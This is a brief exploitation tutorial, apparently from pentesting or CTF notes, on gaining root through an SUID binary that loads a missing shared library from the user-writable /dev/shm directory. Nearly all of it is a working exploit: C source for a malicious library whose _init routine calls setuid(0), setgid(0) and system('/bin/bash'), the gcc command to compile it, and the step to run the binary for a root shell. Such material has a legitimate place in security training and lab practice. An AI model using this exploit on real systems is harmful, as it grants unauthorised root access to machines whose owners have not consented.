# Exploitation

We are going to assume that there's an **SUID binary** called **/usr/bin/welcome**.

However, the user is unable to run it as the binary cannot find a library file *(let's call it **libhello.so**)* which should be in `/dev/shm`.

Since, this directory is in control of the current user, we'll move there and create a **C** file.
1. 
```c
// /dev/shm/libhello.c

#include <stdlib.h>
#include <unistd.h>

void _init() {
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```

Since we set the *uid* and  *gid* to **0**, our shell will be owned by root.

2. 
Now we need to compile it as a library file and save it to `/dev/shm`
```bash

gcc -shared libhello.c -o libhello.so -fPIC -nostartfiles

```

3. Run `/usr/bin/welcome` and enjoy the elevated shell
  

# References
- [https://tbhaxor.com/exploiting-shared-library-misconfigurations/](https://tbhaxor.com/exploiting-shared-library-misconfigurations/)